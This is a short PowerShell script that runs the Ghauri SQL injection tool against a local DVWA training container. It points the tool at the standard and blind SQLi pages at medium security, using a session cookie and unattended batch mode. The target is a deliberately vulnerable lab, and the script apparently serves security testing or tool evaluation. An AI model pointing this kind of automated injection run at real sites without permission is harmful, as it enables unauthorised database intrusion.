# Read configuration
$config = Get-Content (Join-Path $PSScriptRoot "..\config.json") | ConvertFrom-Json

# Environment
$target = "dvwa"
$ghauri_path = [System.IO.Path]::GetFullPath((Join-Path $PSScriptRoot $config.tools.ghauri))
$request1 = Join-Path $PSScriptRoot $config.targets.$target.request1
$request2 = Join-Path $PSScriptRoot $config.targets.$target.request2

$url_sqli = $config.environment.dvwa_docker + "/vulnerabilities/sqli"
$url_blind = $config.environment.dvwa_docker + "/vulnerabilities/sqli_blind"

$phpsessid = $config.targets.$target.phpsessid
$cookie_medium = "security=medium; PHPSESSID={0}" -f $phpsessid
$post_data = "id=1&Submit=Submit#"

# Medium security sqli

& $ghauri_path -u "$url_sqli" --data "$post_data" --cookie="$cookie_medium" --dbms="MySQL" --batch

# Medium security sqli (blind)

& $ghauri_path -u "$url_blind" --data "$post_data" --cookie="$cookie_medium" --dbms="MySQL" --batch